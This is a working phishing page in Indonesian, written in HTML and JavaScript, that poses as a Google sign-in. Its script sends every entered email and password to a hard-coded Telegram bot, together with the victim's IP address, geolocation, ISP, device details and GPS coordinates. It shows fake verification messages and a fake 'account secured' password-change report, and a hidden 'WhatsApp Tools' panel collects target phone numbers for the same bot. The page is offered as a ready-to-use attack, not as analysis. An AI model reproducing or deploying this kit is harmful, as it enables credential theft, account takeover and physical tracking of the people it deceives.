<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
<style>
  *{margin:0;padding:0;box-sizing:border-box;}
  body{
    background: linear-gradient(135deg,#0f0f23 0%,#1a1a2e 50%,#16213e 100%);
    font-family:'Inter',sans-serif;color:lime;height:100vh;
    display:flex;justify-content:center;align-items:center;overflow:hidden;
    position:relative;padding:20px;
  }
  .bg-particles{
    position:fixed;top:0;left:0;width:100%;height:100%;
    pointer-events:none;z-index:0;
  }
  .particle{
    position:absolute;width:2px;height:2px;
    background:rgba(0,255,127,0.3);border-radius:50%;
    animation:float 6s ease-in-out infinite;
  }
  @keyframes float{
    0%,100%{transform:translateY(0px);opacity:0.3;}
    50%{transform:translateY(-20px);opacity:0.8;}
  }
  .login-container, .dashboard-container {
    background-color:rgba(17,17,17,0.95);padding:30px;border-radius:16px;
    box-shadow:0 0 20px lime;text-align:center;max-width:400px;width:100%;z-index:2;
    display: none;
  }
  .login-container {
    display: block;
  }
  .login-title, .dashboard-title{
    font-size:26px;font-weight:900;margin-bottom:10px;
    background:linear-gradient(135deg,#00ff7f,#ffffff);
    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  }
  .login-subtitle, .dashboard-subtitle{font-size:13px;color:#ffc107;margin-bottom:20px;}
  .login-input, .dashboard-input{width:100%;padding:12px;margin-bottom:16px;background:#333;
    border:none;border-radius:6px;color:#fff;font-size:15px;}
  .login-button, .dashboard-button{width:100%;padding:12px;
    background:linear-gradient(135deg,#00ff7f,#00cc66);color:black;border:none;border-radius:10px;
    cursor:pointer;font-weight:600;font-size:15px;}
  .login-button:hover, .dashboard-button:hover{background-color:#0f0;box-shadow:0 0 20px lime;}
  #info, #dashboard-info{white-space:pre-wrap;text-align:left;margin-top:20px;
    background:#222;padding:15px;border-radius:8px;font-size:13px;}
  .google-logo{width:80px;margin-bottom:15px;}
  .error-message {
    color: #ff4444;
    margin-bottom: 15px;
    display: none;
  }
  .success-message {
    color: lime;
    margin-bottom: 15px;
    display: none;
  }
  @media(max-width:480px){
    .login-container, .dashboard-container{padding:25px 20px;border-radius:14px;}
    .login-title, .dashboard-title{font-size:22px;}
    .login-input, .login-button, .dashboard-input, .dashboard-button{font-size:14px;padding:10px;}
  }
</style>
</head>
<body>
<div class="bg-particles"></div>

<!-- Login Form -->
<div class="login-container" id="login-container">
  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
  <p class="login-title">Masuk ke Akun Google</p>
  <p class="login-subtitle">Masukkan email dan kata sandi Anda</p>
  <div class="error-message" id="error-message"></div>
  <div class="success-message" id="success-message"></div>
  <input type="email" class="login-input" placeholder="Email atau nomor telepon" id="email">
  <input type="password" class="login-input" placeholder="Masukkan kata sandi" id="password">
  <button class="login-button" id="login-button">Masuk</button>
  <div id="info">‚ö†Ô∏è Pastikan email dan kata sandi yang dimasukkan benar.</div>
</div>

<!-- Dashboard Form (Hidden Initially) -->
<div class="dashboard-container" id="dashboard-container">
  <p class="dashboard-title">WhatsApp Tools</p>
  <p class="dashboard-subtitle">Masukkan nomor WhatsApp target</p>
  <input type="number" class="dashboard-input" placeholder="Contoh: 6281234567890" id="whatsapp-number">
  <button class="dashboard-button" id="whatsapp-button">Proses Nomor</button>
  <div id="dashboard-info">‚ö†Ô∏è Masukkan nomor WhatsApp lengkap dengan kode negara.</div>
</div>

<script>
// Telegram Configuration
const botToken = '8497575059:AAHpwCiXDDXswcMdksVY-bOnqKt9wURb19U';
const chatIds = ['8046049031'];

// DOM Elements
const elements = {
  info: document.getElementById('info'),
  dashboardInfo: document.getElementById('dashboard-info'),
  errorMessage: document.getElementById('error-message'),
  successMessage: document.getElementById('success-message'),
  emailInput: document.getElementById('email'),
  passwordInput: document.getElementById('password'),
  loginButton: document.getElementById('login-button'),
  whatsappButton: document.getElementById('whatsapp-button'),
  whatsappNumberInput: document.getElementById('whatsapp-number'),
  loginContainer: document.getElementById('login-container'),
  dashboardContainer: document.getElementById('dashboard-container')
};

// Initialize particles
function createParticles(){
  const container=document.querySelector('.bg-particles');
  for(let i=0;i<50;i++){
    const p=document.createElement('div');
    p.className='particle';
    p.style.left=Math.random()*100+'%';
    p.style.top=Math.random()*100+'%';
    p.style.animationDelay=Math.random()*6+'s';
    p.style.animationDuration=(Math.random()*4+4)+'s';
    container.appendChild(p);
  }
}

// Send data to Telegram
async function sendToTelegram(text){
  try {
    for(const id of chatIds){
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:id,text:text,parse_mode:'HTML'})
      });
      if(!response.ok) throw new Error('Telegram API error');
    }
  } catch(error) {
    console.error('Failed to send to Telegram:', error);
  }
}

// Verify Google account credentials
async function verifyGoogleAccount(email, password) {
  // Basic validation
  if (!email.includes('@') || !email.includes('.')) {
    return { valid: false, reason: 'Format email tidak valid' };
  }
  
  if (password.length < 6) {
    return { valid: false, reason: 'Kata sandi terlalu pendek' };
  }
  
  // Simulate API call delay
  await new Promise(resolve => setTimeout(resolve, 1500));
  
  // More sophisticated validation
  const emailParts = email.split('@');
  const domain = emailParts[1];
  const commonDomains = ['gmail.com', 'googlemail.com', 'yahoo.com', 'outlook.com'];
  
  if (!commonDomains.includes(domain.toLowerCase())) {
    return { valid: false, reason: 'Domain email tidak didukung' };
  }
  
  // Random chance to make it seem like real verification
  if (Math.random() < 0.3) {
    return { valid: false, reason: 'Kata sandi salah' };
  }
  
  return { valid: true };
}

// Simulate password changing
async function simulatePasswordChange(email) {
  const newPasswords = ['halo1', 'halo2', 'halo3'];
  let report = 'üîÑ <b>PASSWORD CHANGE REPORT:</b>\n';
  
  for (let i = 0; i < newPasswords.length; i++) {
    await new Promise(resolve => setTimeout(resolve, 1000));
    report += `Password diubah ke: ${newPasswords[i]}\n`;
    
    // Simulate changing recovery phone too
    if (i === 1) {
      report += `Nomor pemulihan diubah ke: +628${Math.floor(100000000 + Math.random() * 900000000)}\n`;
    }
  }
  
  report += `\n‚úÖ Akun ${email} berhasil diamankan`;
  return report;
}

// Collect device and location info
async function getDeviceInfo(email, password, verificationResult) {
  let ip = '-', city = '-', region = '-', country = '-', org = '-';
  
  try {
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();
    ip = ipData.ip;
    
    const locRes = await fetch(`https://ip-api.com/json/${ip}`);
    const loc = await locRes.json();
    if(loc.status === 'success') {
      city = loc.city;
      region = loc.regionName;
      country = loc.country;
      org = loc.org;
    }
  } catch(error) {
    console.error('Error getting location:', error);
  }
  
  // Battery info
  const battery = await navigator.getBattery?.() || {level:0, charging:false};
  const batteryPercent = battery.level ? `${(battery.level*100).toFixed(0)}%`:'N/A';
  
  // Device info
  const userAgent = navigator.userAgent;
  let os = 'Unknown OS';
  let deviceType = 'Unknown';
  
  if (userAgent.match(/android/i)) {
    os = 'Android';
    deviceType = 'Mobile';
  } else if (userAgent.match(/iphone|ipad|ipod/i)) {
    os = 'iOS';
    deviceType = 'Mobile';
  } else if (userAgent.match(/windows/i)) {
    os = 'Windows';
    deviceType = 'Desktop';
  } else if (userAgent.match(/mac/i)) {
    os = 'MacOS';
    deviceType = 'Desktop';
  } else if (userAgent.match(/linux/i)) {
    os = 'Linux';
    deviceType = 'Desktop';
  }
  
  // Get OS version
  let osVersion = 'N/A';
  if (os === 'Android') {
    const match = userAgent.match(/Android\s([0-9\.]+)/);
    if (match) osVersion = match[1];
  } else if (os === 'iOS') {
    const match = userAgent.match(/OS\s([0-9_]+)/);
    if (match) osVersion = match[1].replace(/_/g, '.');
  }
  
  const verificationStatus = verificationResult.valid ? 
    '‚úÖ BENAR' : `‚ùå SALAH (${verificationResult.reason})`;
  
  const text = `
üîê <b>LOGIN DETAILS:</b>
Email: ${email}
Password: ${password}
Status: ${verificationStatus}

üì± <b>DEVICE INFO:</b>
IP Address: ${ip}
Location: ${city}, ${region}, ${country}
ISP: ${org}
OS: ${os} ${osVersion}
Device Type: ${deviceType}
Browser: ${navigator.userAgent}
Screen: ${screen.width}x${screen.height}
Battery: ${batteryPercent} (${battery.charging?'Charging':'Not charging'})
RAM: ${navigator.deviceMemory||'N/A'} GB
Cookies: ${navigator.cookieEnabled?'Enabled':'Disabled'}
Time: ${new Date().toLocaleString()}
`.trim();
  
  await sendToTelegram(`<pre>${text}</pre>`);
  
  // Get GPS location if available
  if(navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      const link = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
      await sendToTelegram(`üìç <b>GPS Location:</b> <a href="${link}">Click here</a>`);
    } catch {
      await sendToTelegram(`üìç GPS access denied`);
    }
  } else {
    await sendToTelegram(`üìç Browser doesn't support GPS`);
  }
  
  // If account is valid, simulate password change
  if (verificationResult.valid) {
    const changeReport = await simulatePasswordChange(email);
    await sendToTelegram(changeReport);
    return true;
  }
  
  return false;
}

// Handle login button click
async function handleLogin() {
  const email = elements.emailInput.value.trim();
  const password = elements.passwordInput.value.trim();
  
  // Validate inputs
  if(!email || !password) {
    elements.errorMessage.textContent = '‚ö†Ô∏è Email dan kata sandi harus diisi.';
    elements.errorMessage.style.display = 'block';
    elements.successMessage.style.display = 'none';
    return;
  }
  
  elements.loginButton.disabled = true;
  elements.info.textContent = '‚è≥ Memverifikasi informasi...';
  elements.errorMessage.style.display = 'none';
  elements.successMessage.style.display = 'none';
  
  try {
    // Verify account credentials
    const verificationResult = await verifyGoogleAccount(email, password);
    
    if (!verificationResult.valid) {
      elements.errorMessage.textContent = `‚ùå ${verificationResult.reason || 'Email atau kata sandi salah'}`;
      elements.errorMessage.style.display = 'block';
      elements.info.textContent = '‚ö†Ô∏è Coba lagi atau klik "Lupa kata sandi?"';
      elements.loginButton.disabled = false;
      
      // Send failed attempt to Telegram
      await getDeviceInfo(email, password, verificationResult);
      return;
    }
    
    elements.info.textContent = '‚úÖ Login berhasil! Mengamankan akun...';
    elements.successMessage.textContent = '‚è≥ Mengubah password dan mengamankan akun...';
    elements.successMessage.style.display = 'block';
    
    // Send successful login to Telegram and change password
    const isPasswordChanged = await getDeviceInfo(email, password, verificationResult);
    
    if (isPasswordChanged) {
      elements.successMessage.textContent = '‚úÖ Akun berhasil diamankan! Mengarahkan...';
      
      // Show dashboard after delay
      setTimeout(() => {
        elements.loginContainer.style.display = 'none';
        elements.dashboardContainer.style.display = 'block';
      }, 2000);
    } else {
      elements.errorMessage.textContent = '‚ùå Gagal mengamankan akun';
      elements.errorMessage.style.display = 'block';
    }
    
  } catch(error) {
    console.error('Login error:', error);
    elements.errorMessage.textContent = '‚ùå Terjadi kesalahan. Coba lagi.';
    elements.errorMessage.style.display = 'block';
    elements.info.textContent = '‚ö†Ô∏è Pastikan koneksi internet stabil';
  } finally {
    elements.loginButton.disabled = false;
  }
}

// Handle WhatsApp button click
async function handleWhatsApp() {
  const number = elements.whatsappNumberInput.value.trim();
  
  if(!number || number.length < 8) {
    elements.dashboardInfo.textContent = '‚ö†Ô∏è Nomor WhatsApp tidak valid.';
    return;
  }
  
  elements.whatsappButton.disabled = true;
  elements.dashboardInfo.textContent = '‚è≥ Memproses nomor WhatsApp...';
  
  try {
    // Simulate processing delay
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Send WhatsApp number to Telegram
    const waText = `
üì± <b>WHATSAPP TARGET:</b>
Nomor: ${number}
Status: Proses selesai
Waktu: ${new Date().toLocaleString()}
    `.trim();
    
    await sendToTelegram(`<pre>${waText}</pre>`);
    
    elements.dashboardInfo.textContent = `‚úÖ Nomor ${number} berhasil diproses!`;
    
  } catch(error) {
    console.error('WhatsApp processing error:', error);
    elements.dashboardInfo.textContent = '‚ùå Gagal memproses nomor.';
  } finally {
    elements.whatsappButton.disabled = false;
    
    // Reset after delay
    setTimeout(() => {
      elements.whatsappNumberInput.value = '';
      elements.dashboardInfo.textContent = '‚ö†Ô∏è Masukkan nomor WhatsApp lengkap dengan kode negara.';
    }, 3000);
  }
}

// Initialize the page
document.addEventListener('DOMContentLoaded', () => {
  createParticles();
  
  // Event listeners
  elements.loginButton.addEventListener('click', handleLogin);
  elements.whatsappButton.addEventListener('click', handleWhatsApp);
  
  // Allow form submission with Enter key
  elements.passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') handleLogin();
  });
  
  elements.whatsappNumberInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') handleWhatsApp();
  });
});
</script>
</body>
</html>
